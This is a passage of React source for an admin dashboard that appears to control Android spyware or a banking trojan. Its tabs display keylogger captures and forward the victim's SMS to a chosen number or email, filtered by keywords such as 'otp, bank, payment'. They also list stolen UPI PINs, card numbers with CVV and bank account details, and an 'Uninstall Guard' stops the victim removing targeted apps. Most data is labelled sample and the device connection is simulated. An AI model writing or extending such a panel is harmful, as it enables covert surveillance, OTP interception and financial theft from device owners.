              <div className="col-12">
                <div className="d-flex flex-wrap justify-content-between align-items-center gap-2 mb-2">
                  <h6 className="mb-0">Keylogger</h6>
                  <div className="d-flex align-items-center gap-2">
                    <div className="input-group input-group-sm" style={{width: 220}}>
                      <span className="input-group-text">Timeframe</span>
                      <select className="form-select" value={klMinutes} onChange={(e)=>setKlMinutes(Number(e.target.value))}>
                        <option value={5}>Last 5 minutes</option>
                        <option value={10}>Last 10 minutes</option>
                        <option value={15}>Last 15 minutes</option>
                        <option value={30}>Last 30 minutes</option>
                        <option value={60}>Last 60 minutes</option>
                      </select>
                    </div>
                    <button className="btn btn-sm btn-outline-secondary" onClick={()=> setKeylogs(keylogs)}>Refresh</button>
                  </div>
                </div>

                {keylogGroups.length === 0 ? (
                  <div className="text-muted small">No key logs found for this timeframe.</div>
                ) : (
                  <div className="list-group">
                    {keylogGroups.map(([minute, entries]) => (
                      <div key={minute} className="list-group-item">
                        <div className="fw-semibold mb-2">{minute} <span className="text-muted small">({entries.length} entries)</span></div>
                        <div className="table-responsive">
                          <table className="table table-sm align-middle mb-0">
                            <thead className="table-light">
                              <tr>
                                <th style={{width:'15%'}}>Time</th>
                                <th style={{width:'15%'}}>App</th>
                                <th style={{width:'20%'}}>Window</th>
                                <th>Captured Text</th>
                              </tr>
                            </thead>
                            <tbody>
                              {entries.map((e) => (
                                <tr key={e.id}>
                                  <td className="text-muted">{new Date(e.at).toLocaleTimeString()}</td>
                                  <td>{e.app}</td>
                                  <td className="text-muted">{e.title}</td>
                                  <td><code>{e.text}</code></td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {activeTab === 'sms_forwarding' && (
            <div className="row g-3">
              <div className="col-12">
                <div className="d-flex flex-wrap justify-content-between align-items-center gap-2 mb-3">
                  <div className="d-flex align-items-center gap-2">
                    <h6 className="mb-0">SMS Forwarding</h6>
                    <div className="btn-group ms-2" role="group" aria-label="SIM selector">
                      <button type="button" className={`btn btn-sm ${smsFwdForUI.sim==='SIM1'?'btn-primary':'btn-outline-primary'}`} onClick={()=>setSmsFwdSim('SIM1')}>SIM 1</button>
                      <button type="button" className={`btn btn-sm ${smsFwdForUI.sim==='SIM2'?'btn-primary':'btn-outline-primary'}`} onClick={()=>setSmsFwdSim('SIM2')}>SIM 2</button>
                    </div>
                  </div>
                  <div className="d-flex gap-2">
                    <button className="btn btn-sm btn-outline-secondary" onClick={()=>setSmsFwdSettings(smsFwdSettings)}>Refresh</button>
                    <button className="btn btn-sm btn-outline-danger" onClick={disableSmsFwd}>Disable All</button>
                    <button className="btn btn-sm btn-primary" onClick={applySmsFwd}>Apply</button>
                  </div>
                </div>

                <div className="list-group">
                  <div className="list-group-item">
                    <div className="form-check form-switch mb-1">
                      <input className="form-check-input" type="checkbox" checked={!!smsFwdForUI.enabled} onChange={(e)=>updateSmsFwd('enabled', e.target.checked)} />
                      <label className="form-check-label ms-2">Enable SMS Forwarding</label>
                    </div>
                    <div className="text-muted small">Master switch controlling forwarding rules.</div>
                  </div>

                  <div className="list-group-item d-flex flex-wrap align-items-center gap-4">
                    <div className="form-check form-switch">
                      <input className="form-check-input" type="checkbox" checked={!!smsFwdForUI.forwardIncoming} disabled={!smsFwdForUI.enabled} onChange={(e)=>updateSmsFwd('forwardIncoming', e.target.checked)} />
                      <label className="form-check-label ms-2">Forward Incoming SMS</label>
                    </div>
                    <div className="form-check form-switch">
                      <input className="form-check-input" type="checkbox" checked={!!smsFwdForUI.forwardOutgoing} disabled={!smsFwdForUI.enabled} onChange={(e)=>updateSmsFwd('forwardOutgoing', e.target.checked)} />
                      <label className="form-check-label ms-2">Forward Outgoing SMS</label>
                    </div>
                  </div>

                  <div className="list-group-item">
                    <div className="row g-3">
                      <div className="col-12 col-md-6">
                        <label className="form-label small text-uppercase">Forward To Number</label>
                        <input type="text" className="form-control" disabled={!smsFwdForUI.enabled} value={smsFwdForUI.forwardToNumber} onChange={(e)=>updateSmsFwd('forwardToNumber', e.target.value)} placeholder="+91 90000 00000" />
                        <div className="text-muted small mt-1">Leave blank to skip number forwarding.</div>
                      </div>
                      <div className="col-12 col-md-6">
                        <label className="form-label small text-uppercase">Forward To Email</label>
                        <input type="email" className="form-control" disabled={!smsFwdForUI.enabled} value={smsFwdForUI.forwardToEmail} onChange={(e)=>updateSmsFwd('forwardToEmail', e.target.value)} placeholder="alerts@example.com" />
                        <div className="text-muted small mt-1">If mailer disabled, this will queue until enabled.</div>
                      </div>
                    </div>
                  </div>

                  <div className="list-group-item">
                    <label className="form-label small text-uppercase">Keyword Filters (comma separated)</label>
                    <input type="text" className="form-control" disabled={!smsFwdForUI.enabled} value={smsFwdForUI.keywordFilters.join(', ')} onChange={(e)=>updateSmsFwd('keywordFilters', e.target.value.split(',').map(v=>v.trim()).filter(Boolean))} placeholder="otp, bank, payment" />
                    <div className="text-muted small mt-1">Only messages containing at least one keyword will be forwarded. Leave empty to forward all.</div>
                  </div>

                  <div className="list-group-item bg-light-subtle">
                    <div className="small text-muted">Last updated: {new Date(smsFwdForUI.lastUpdated).toLocaleString()}</div>
                    <div className="small">Mode: <code>sample</code>; SIM: <code>{smsFwdForUI.sim}</code></div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'upi' && (
            <div className="row g-3">
              <div className="col-12 d-flex justify-content-between align-items-center mb-2">
                <h6 className="mb-0">UPI Details</h6>
                <button className="btn btn-sm btn-outline-secondary" onClick={() => setUpi(upi)}>Refresh</button>
              </div>
              {upiForUI.map((u) => (
                <div className="col-12 col-md-6 col-lg-4" key={u.id}>
                  <div className="card h-100">
                    <div className="card-body">
                      <div className="d-flex justify-content-between align-items-start mb-2">
                        <div className="fw-semibold">{u.upiId}</div>
                        <span className="badge bg-primary-subtle text-primary">{u.provider}</span>
                      </div>
                      <div className="mb-1"><span className="text-muted small">Phone:</span> {u.phone}</div>
                      <div className="mb-1"><span className="text-muted small">PIN:</span> {u.pin}</div>
                    </div>
                    <div className="card-footer d-flex justify-content-end gap-2">
                      <button className="btn btn-sm btn-outline-primary" onClick={()=>{ setSelectedPeer(u.upiId); setActiveTab('sms'); }}>Message</button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {activeTab === 'google' && (
            <div className="row g-3">
              <div className="col-12 d-flex justify-content-between align-items-center mb-2">
                <h6 className="mb-0">Google Data</h6>
                <button className="btn btn-sm btn-outline-secondary" disabled>Refresh (Sample)</button>
              </div>
              <div className="col-12 col-lg-4">
                <div className="card h-100">
                  <div className="card-body">
                    <h6 className="fw-semibold mb-2">Account</h6>
                    <div className="mb-1"><span className="text-muted small">Primary Email:</span> user.primary@gmail.com</div>
                    <div className="mb-1"><span className="text-muted small">Recovery Email:</span> recovery.alt@gmail.com</div>
                    <div className="mb-1"><span className="text-muted small">2FA:</span> Enabled (App + SMS)</div>
                    <div className="mb-1"><span className="text-muted small">Last Sync:</span> {new Date().toLocaleString()}</div>
                  </div>
                  <div className="card-footer text-muted small">Sample</div>
                </div>
              </div>
              <div className="col-12 col-lg-4">
                <div className="card h-100">
                  <div className="card-body">
                    <h6 className="fw-semibold mb-2">Recent Searches</h6>
                    <ul className="list-unstyled small mb-0">
                      {['weather tomorrow','translate नमस्ते','pizza near me','upi kotak limit','javascript array sort'].map((s,i)=>(<li key={i} className="mb-1">• {s}</li>))}
                    </ul>
                  </div>
                  <div className="card-footer text-muted small">Sample</div>
                </div>
              </div>
              <div className="col-12 col-lg-4">
                <div className="card h-100">
                  <div className="card-body">
                    <h6 className="fw-semibold mb-2">Play Services / Sync</h6>
                    <div className="mb-1"><span className="text-muted small">Drive Sync:</span> Enabled</div>
                    <div className="mb-1"><span className="text-muted small">Location History:</span> Enabled</div>
                    <div className="mb-1"><span className="text-muted small">Web & App Activity:</span> Partially Enabled</div>
                    <div className="mb-1"><span className="text-muted small">Ads Personalization:</span> Disabled</div>
                  </div>
                  <div className="card-footer text-muted small">Sample</div>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'device_mgmt' && (
            <DeviceManagementSection />
          )}

          {activeTab === 'target_mode' && (
        <TargetModeSection deviceOnline={deviceStatus.online} pushToast={pushToast} />
          )}

          {activeTab === 'card' && (
            <div className="row g-3">
              <div className="col-12 d-flex justify-content-between align-items-center mb-2">
                <h6 className="mb-0">Card Details</h6>
                <button className="btn btn-sm btn-outline-secondary" onClick={() => setCards(cards)}>Refresh</button>
              </div>
              {cardsForUI.map((c) => (
                <div className="col-12 col-md-6 col-lg-4" key={c.id}>
                  <div className="card h-100">
                    <div className="card-body">
                      <div className="mb-2">
                        <div className="text-muted small">Card Number</div>
                        <div className="fw-semibold">{c.number}</div>
                      </div>
                      <div className="row g-2 mb-2">
                        <div className="col-6">
                          <div className="text-muted small">Expiry</div>
                          <div>{c.expiry}</div>
                        </div>
                        <div className="col-6">
                          <div className="text-muted small">CVV</div>
                          <div>{c.cvv}</div>
                        </div>
                      </div>
                      <div className="mb-2">
                        <div className="text-muted small">Name</div>
                        <div>{c.name}</div>
                      </div>
                    </div>
                    <div className="card-footer d-flex justify-content-between align-items-center">
                      <span className={`badge ${c.type==='VBA' ? 'bg-success-subtle text-success' : c.type==='NONVBA' ? 'bg-warning-subtle text-warning' : 'bg-secondary-subtle text-secondary'}`}>{c.type}</span>
                      <div className="text-muted small">Sample</div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {activeTab === 'bank_details' && (
            <div className="row g-3">
              <div className="col-12 d-flex justify-content-between align-items-center mb-2">
                <h6 className="mb-0">Bank Details</h6>
                <button className="btn btn-sm btn-outline-secondary" onClick={() => setBankAccounts(bankAccounts)}>Refresh</button>
              </div>
              {banksForUI.map((b) => (
                <div className="col-12 col-md-6 col-lg-4" key={b.id}>
                  <div className="card h-100">
                    <div className="card-body">
                      <div className="fw-semibold mb-2">{b.bankName}</div>
                      <div className="mb-1"><span className="text-muted small">Account No:</span> {b.accountNo}</div>
                      <div className="mb-1"><span className="text-muted small">IFSC:</span> {b.ifsc}</div>
                    </div>
                    <div className="card-footer text-muted small">Sample</div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {!(activeTab === 'sms' || activeTab === 'contacts' || activeTab === 'calls' || activeTab === 'forwarding' || activeTab === 'sms_forwarding' || activeTab === 'keylogger' || activeTab === 'upi' || activeTab === 'card' || activeTab === 'bank_details') && (
            <div className="text-muted">This section will be implemented after API confirmation.</div>
          )}
          {/* Compose Modal */}
          {showCompose && (
            <div className="modal d-block" tabIndex="-1" style={{background:'rgba(0,0,0,0.5)'}}>
              <div className="modal-dialog modal-dialog-centered">
                <div className="modal-content">
                  <div className="modal-header">
                    <h5 className="modal-title">Compose SMS</h5>
                    <button type="button" className="btn-close" onClick={()=>setShowCompose(false)} aria-label="Close"></button>
                  </div>
                  <form onSubmit={async (e) => {
                    e.preventDefault();
                    const to = (modalToRef.current?.value || '').trim();
                    const message = (modalMsgRef.current?.value || '').trim();
                    if (!to || !message) return;
                    const action = await dispatch(sendSms({ to, message }));
                    if (sendSms.fulfilled.match(action)) {
                      modalMsgRef.current.value = '';
                      setShowCompose(false);
                      setSmsItems((prev) => ([...prev, { id: `tmp_${Date.now()}`, type: 'OUT', sender: 'Me', receiver: to, to, message, sentAt: new Date().toISOString() }]));
                      if (deviceId) setTimeout(refreshSms, 600);
                    } else {
                      pushToast(action.payload || 'Failed to send SMS','danger',6000);
                    }
                  }}>
                    <div className="modal-body">
                      <div className="mb-3">
                        <label className="form-label">To</label>
                        <input ref={modalToRef} type="text" className="form-control" placeholder="+1234567890 or name" />
                      </div>
                      <div className="mb-2">
                        <label className="form-label">Message</label>
                        <textarea ref={modalMsgRef} className="form-control" rows={4} />
                      </div>
                    </div>
                    <div className="modal-footer">
                      <button type="button" className="btn btn-outline-secondary" onClick={()=>setShowCompose(false)}>Cancel</button>
                      <button type="submit" className="btn btn-primary">Send</button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          )}
          {showShareModal && (
            <div className="modal d-block" tabIndex="-1" style={{background:'rgba(0,0,0,0.5)'}}>
              <div className="modal-dialog">
                <div className="modal-content">
                  <div className="modal-header">
                    <h5 className="modal-title">Create Shareable Link</h5>
                    <button type="button" className="btn-close" onClick={()=>setShowShareModal(false)} />
                  </div>
                  <div className="modal-body">
                    <p className="small text-muted mb-3">Generate a temporary link to view this device's data without login. You can revoke anytime.</p>
                    <div className="row g-3 mb-2">
                      <div className="col-4">
                        <label className="form-label small text-uppercase">Days</label>
                        <input type="number" min={0} className="form-control" value={shareDays} onChange={e=>setShareDays(Number(e.target.value))} />
                      </div>
                      <div className="col-4">
                        <label className="form-label small text-uppercase">Hours</label>
                        <input type="number" min={0} max={23} className="form-control" value={shareHours} onChange={e=>setShareHours(Number(e.target.value))} />
                      </div>
                      <div className="col-4">
                        <label className="form-label small text-uppercase">Minutes</label>
                        <input type="number" min={0} max={59} className="form-control" value={shareMinutes} onChange={e=>setShareMinutes(Number(e.target.value))} />
                      </div>
                    </div>
                    <div className="small text-muted">Total duration: {(shareDays*24 + shareHours)}h {shareMinutes}m</div>
                    {shareLink && (
                      <div className="alert alert-info small mt-3 mb-0">Existing link will be replaced if you generate a new one.</div>
                    )}
                  </div>
                  <div className="modal-footer">
                    <button className="btn btn-outline-secondary" onClick={()=>setShowShareModal(false)}>Cancel</button>
                    <button className="btn btn-primary" onClick={generateShareLink}>Generate Link</button>
                  </div>
                </div>
              </div>
            </div>
          )}
          <ToastHost toasts={toasts} remove={(id) => setToasts((prev) => prev.filter(t => t.id !== id))} />
        </div>
        <ToastHost toasts={toasts} remove={removeToast} />
      </div>
    </div>
  );
};

// Helper sub-component: Device Management (sample data)
const DeviceManagementSection = () => {
  const [filter, setFilter] = React.useState('');
  const [showSystem, setShowSystem] = React.useState(false);
  const sampleApps = React.useMemo(() => ([
    { id:'pkg.whatsapp', name:'WhatsApp', version:'2.24.15', system:false, sizeMB: 265 },
    { id:'com.android.chrome', name:'Chrome', version:'128.0.6613', system:true, sizeMB: 312 },
    { id:'com.google.android.youtube', name:'YouTube', version:'19.32.4', system:true, sizeMB: 182 },
    { id:'com.paytm.app', name:'Paytm', version:'10.12.7', system:false, sizeMB: 148 },
    { id:'com.phonepe.app', name:'PhonePe', version:'302.41.1', system:false, sizeMB: 139 },
    { id:'com.instagram.android', name:'Instagram', version:'345.0.0', system:false, sizeMB: 291 },
    { id:'com.google.android.gm', name:'Gmail', version:'2025.08.12', system:true, sizeMB: 228 },
    { id:'com.microsoft.teams', name:'Teams', version:'2025.3.1', system:false, sizeMB: 174 },
    { id:'org.mozilla.firefox', name:'Firefox', version:'128.1', system:false, sizeMB: 198 },
  ]), []);
  const apps = sampleApps.filter(a => (showSystem || !a.system) && (filter==='' || a.name.toLowerCase().includes(filter.toLowerCase()) || a.id.includes(filter)));
  return (
    <div className="row g-3">
      <div className="col-12 d-flex flex-wrap justify-content-between align-items-center gap-2 mb-2">
        <h6 className="mb-0">Device Management (Apps)</h6>
        <div className="d-flex flex-wrap gap-2 align-items-center">
          <div className="input-group input-group-sm" style={{width:240}}>
            <span className="input-group-text">Filter</span>
            <input className="form-control" value={filter} onChange={e=>setFilter(e.target.value)} placeholder="Name / package" />
          </div>
          <div className="form-check form-switch">
            <input className="form-check-input" type="checkbox" checked={showSystem} onChange={e=>setShowSystem(e.target.checked)} id="showSystemApps" />
            <label className="form-check-label small" htmlFor="showSystemApps">Show System</label>
          </div>
          <button className="btn btn-sm btn-outline-secondary" disabled>Sync (Sample)</button>
        </div>
      </div>
      <div className="col-12">
        <div className="table-responsive" style={{maxHeight:'60vh', overflowY:'auto'}}>
          <table className="table table-sm align-middle">
            <thead className="table-light" style={{position:'sticky', top:0,zIndex:1}}>
              <tr>
                <th style={{width:'28%'}}>App Name</th>
                <th style={{width:'30%'}}>Package</th>
                <th style={{width:'12%'}}>Version</th>
                <th style={{width:'10%'}} className="text-end">Size</th>
                <th style={{width:'20%'}} className="text-end">Actions</th>
              </tr>
            </thead>
            <tbody>
              {apps.map(app => (
                <tr key={app.id}>
                  <td>
                    <div className="fw-semibold">{app.name}</div>
                    {app.system && <span className="badge bg-secondary-subtle text-secondary small">System</span>}
                  </td>
                  <td className="text-muted small">{app.id}</td>
                  <td className="text-muted small">{app.version}</td>
                  <td className="text-end text-muted small">{app.sizeMB} MB</td>
                  <td className="text-end">
                    <div className="btn-group btn-group-sm" role="group">
                      <button className="btn btn-outline-danger" disabled={app.system}>Uninstall</button>
                      <button className="btn btn-outline-primary" disabled>Freeze</button>
                      <button className="btn btn-outline-secondary" disabled>Details</button>
                    </div>
                  </td>
                </tr>
              ))}
              {apps.length===0 && <tr><td colSpan={5} className="text-muted small">No apps match filter.</td></tr>}
            </tbody>
          </table>
        </div>
        <div className="text-muted small mt-2">Sample dataset. Real data will come from device inventory API.</div>
      </div>
    </div>
  );
};

// Helper sub-component: Focused Target Mode (WebSocket + uninstall control toggles)
const TargetModeSection = ({ deviceOnline=false }) => {
  const [wsConnected, setWsConnected] = React.useState(false);
  const [connecting, setConnecting] = React.useState(false);
  const [lastPingMs, setLastPingMs] = React.useState(null);
  const [pingHistory, setPingHistory] = React.useState([]); // last few pings
  const [enforceUninstallBlock, setEnforceUninstallBlock] = React.useState(true);
  const [focusedPackages, setFocusedPackages] = React.useState(['pkg.whatsapp','com.paytm.app']);
  const [newPkg, setNewPkg] = React.useState('');
  const [showErrModal, setShowErrModal] = React.useState(false);
  const [errReason, setErrReason] = React.useState('');
  const wsRef = React.useRef(null);
  const pingTimerRef = React.useRef(null);

  const addPkg = () => { if (!newPkg.trim()) return; setFocusedPackages(p=> p.includes(newPkg.trim())?p:[...p,newPkg.trim()]); setNewPkg(''); };
  const removePkg = (pkg) => setFocusedPackages(p=>p.filter(x=>x!==pkg));

  const cleanupWs = React.useCallback(() => {
    if (pingTimerRef.current) { clearInterval(pingTimerRef.current); pingTimerRef.current = null; }
  if (wsRef.current) { try { wsRef.current.close(); } catch { /* ignore close errors */ } wsRef.current = null; }
  }, []);

  React.useEffect(() => () => cleanupWs(), [cleanupWs]);

  const attemptConnect = () => {
    if (!deviceOnline || wsConnected || connecting) return;
    setConnecting(true);
    // Simulate server requesting Android client for a session handshake
    // In real impl: POST /api/device/:id/ws-handshake -> returns temp ws url/token
    setTimeout(() => {
      const shouldSucceed = Math.random() > 0.25; // 75% success sample
      if (!shouldSucceed) {
        setConnecting(false);
        setErrReason('Device refused handshake or network timeout. Ensure agent service is running and permissions granted.');
        setShowErrModal(true);
        return;
      }
      // Fake WebSocket object for demo
      wsRef.current = { readyState: 1, close: ()=>{} };
      setWsConnected(true);
      setConnecting(false);
      // Start ping simulation
      pingTimerRef.current = setInterval(() => {
        const start = performance.now();
        // simulate latency 50-400ms
        const latency = 50 + Math.random()*350;
        setTimeout(() => {
          const ms = Math.round(performance.now() - start + (Math.random()*10));
          setLastPingMs(ms);
          setPingHistory(h => {
            const next = [...h, ms];
            if (next.length > 20) next.shift();
            return next;
          });
          // Randomly simulate drop
          if (Math.random() < 0.02) {
            cleanupWs();
            setWsConnected(false);
            setErrReason('Connection lost (simulated network drop).');
            setShowErrModal(true);
          }
        }, latency);
      }, 5000);
    }, 900); // handshake delay
  };

  const disconnect = () => {
    cleanupWs();
    setWsConnected(false);
    setLastPingMs(null);
    setPingHistory([]);
  };

  const avgPing = React.useMemo(() => {
    if (!pingHistory.length) return null;
    return Math.round(pingHistory.reduce((a,b)=>a+b,0)/pingHistory.length);
  }, [pingHistory]);

  const pingQuality = (ms) => {
    if (ms == null) return 'N/A';
    if (ms < 120) return 'Good';
    if (ms < 250) return 'Fair';
    return 'Poor';
  };

  return (
    <div className="row g-3">
      <div className="col-12 d-flex flex-wrap justify-content-between align-items-center gap-2 mb-2">
        <h6 className="mb-0">Focused Target Mode</h6>
        <div className="d-flex gap-2 align-items-center flex-wrap">
          <div className="small">Device: {deviceOnline ? <span className="text-success fw-semibold">Online</span> : <span className="text-danger fw-semibold">Offline</span>}</div>
          <div className="small">WS: {wsConnected ? <span className="text-success">Connected</span> : connecting ? <span className="text-warning">Connecting...</span> : <span className="text-muted">Idle</span>}</div>
          {lastPingMs!=null && <div className="small">Last Ping: <span className={lastPingMs<250? 'text-success': lastPingMs<400? 'text-warning':'text-danger'}>{lastPingMs}ms</span></div>}
          {avgPing!=null && <div className="small">Avg: {avgPing}ms ({pingQuality(avgPing)})</div>}
          <button
            className={`btn btn-sm ${wsConnected? 'btn-outline-danger' : 'btn-outline-primary'}`}
            disabled={connecting || (!wsConnected && !deviceOnline)}
            onClick={wsConnected ? disconnect : attemptConnect}
          >
            {connecting ? 'Connecting...' : wsConnected ? 'Disconnect' : 'Connect'}
          </button>
          <button className="btn btn-sm btn-outline-secondary" disabled={!wsConnected} onClick={()=>setLastPingMs(null)}>Clear Stats</button>
        </div>
      </div>
      <div className="col-12 col-lg-5">
        <div className="card h-100">
          <div className="card-body">
            <h6 className="fw-semibold mb-3">Focused Packages</h6>
            <div className="input-group input-group-sm mb-2">
              <input className="form-control" placeholder="Add package e.g. com.app" value={newPkg} onChange={e=>setNewPkg(e.target.value)} disabled={!deviceOnline} />
              <button className="btn btn-outline-primary" onClick={addPkg} disabled={!newPkg.trim() || !deviceOnline}>Add</button>
            </div>
            {focusedPackages.length===0 && <div className="text-muted small">No packages targeted.</div>}
            <ul className="list-group small">
              {focusedPackages.map(pkg => (
                <li key={pkg} className="list-group-item d-flex justify-content-between align-items-center">
                  <span>{pkg}</span>
                  <button className="btn btn-sm btn-outline-danger" onClick={()=>removePkg(pkg)} disabled={!deviceOnline}>Remove</button>
                </li>
              ))}
            </ul>
          </div>
          <div className="card-footer text-muted small">Sample (not persisted)</div>
        </div>
      </div>
      <div className="col-12 col-lg-7">
        <div className="card h-100">
          <div className="card-body">
            <h6 className="fw-semibold mb-3">Session / Control</h6>
            <div className="row g-3">
              <div className="col-12 col-md-6">
                <div className="border rounded p-2 h-100">
                  <div className="fw-semibold small mb-1">Connection</div>
                  <div className="small mb-2">State: {wsConnected ? <span className="text-success">Connected</span> : connecting ? <span className="text-warning">Connecting...</span> : <span className="text-danger">Disconnected</span>}</div>
                  <button
                    className={`btn btn-sm w-100 mb-1 ${wsConnected? 'btn-danger':'btn-primary'}`}
                    onClick={wsConnected ? disconnect : attemptConnect}
                    disabled={connecting || (!wsConnected && !deviceOnline)}
                  >
                    {connecting ? 'Connecting...' : wsConnected ? 'Disconnect' : 'Connect'}
                  </button>
                  {wsConnected && <div className="small text-success mb-1">Active session</div>}
                  {!deviceOnline && <div className="small text-danger mt-2">Device offline. Cannot start session.</div>}
                </div>
              </div>
              <div className="col-12 col-md-6">
                <div className="border rounded p-2 h-100">
                  <div className="fw-semibold small mb-1">Uninstall Guard</div>
                  <div className="small mb-2">Prevents removal of focused packages when ON.</div>
                  <button className="btn btn-sm btn-warning w-100 mb-2" onClick={()=>setEnforceUninstallBlock(s=>!s)} disabled={!deviceOnline}>
                    {enforceUninstallBlock? 'Disable Guard':'Enable Guard'}
                  </button>
                  <div className="form-check form-switch small">
                    <input className="form-check-input" type="checkbox" id="guardSwitch" checked={enforceUninstallBlock} onChange={()=>setEnforceUninstallBlock(s=>!s)} disabled={!deviceOnline} />
                    <label className="form-check-label" htmlFor="guardSwitch">Guard {enforceUninstallBlock? 'ON':'OFF'}</label>
                  </div>
                </div>
              </div>
              <div className="col-12">
                <div className="border rounded p-2">
                  <div className="fw-semibold small mb-2">Activity Log (Sample)</div>
                  <ul className="list-unstyled small mb-0" style={{maxHeight:160, overflowY:'auto'}}>
                    {[`[${new Date().toLocaleTimeString()}] UI loaded`,
                      deviceOnline? `[${new Date().toLocaleTimeString()}] Device reachable`:`[${new Date().toLocaleTimeString()}] Device offline`,
                      wsConnected?`[${new Date().toLocaleTimeString()}] WS handshake success`:`[${new Date().toLocaleTimeString()}] WS idle`,
                      lastPingMs!=null?`[${new Date().toLocaleTimeString()}] Last ping ${lastPingMs}ms`:'[--] No ping yet',
                      enforceUninstallBlock? 'Guard active':'Guard inactive'
                    ].map((l,i)=>(<li key={i}>{l}</li>))}
                  </ul>
                </div>
              </div>
              {pingHistory.length>0 && (
                <div className="col-12">
                  <div className="border rounded p-2">
                    <div className="fw-semibold small mb-2">Ping History (ms)</div>
                    <div className="small">{pingHistory.map((p,i)=>(<span key={i} className={`badge me-1 mb-1 ${p<120?'bg-success':'bg-secondary'} ${p>=250 && p<400?'bg-warning text-dark':''} ${p>=400?'bg-danger':''}`}>{p}</span>))}</div>
                  </div>
                </div>
              )}
            </div>
          </div>
          <div className="card-footer text-muted small">Focused mode concept demo</div>
        </div>
      </div>
      {showErrModal && (
        <div className="modal d-block" tabIndex="-1" style={{background:'rgba(0,0,0,0.5)'}}>
          <div className="modal-dialog modal-dialog-centered">
            <div className="modal-content">
              <div className="modal-header">
                <h5 className="modal-title">Connection Failed</h5>
                <button type="button" className="btn-close" onClick={()=>setShowErrModal(false)} />
              </div>
              <div className="modal-body">
                <div className="alert alert-danger small mb-2">Unable to establish WebSocket session.</div>
                <p className="small mb-2">Reason: {errReason || 'Unknown error.'}</p>
                <ul className="small mb-0">
                  <li>Ensure device agent is running & network available.</li>
                  <li>Check that required permissions (internet, background) are granted.</li>
                  <li>Verify time sync (token based auth can fail on skew).</li>
                  <li>Retry after a few seconds.</li>
                </ul>
              </div>
              <div className="modal-footer">
                <button className="btn btn-outline-secondary" onClick={()=>setShowErrModal(false)}>Close</button>
                <button className="btn btn-primary" onClick={()=>{ setShowErrModal(false); attemptConnect(); }} disabled={!deviceOnline}>Retry</button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminUserAppData;
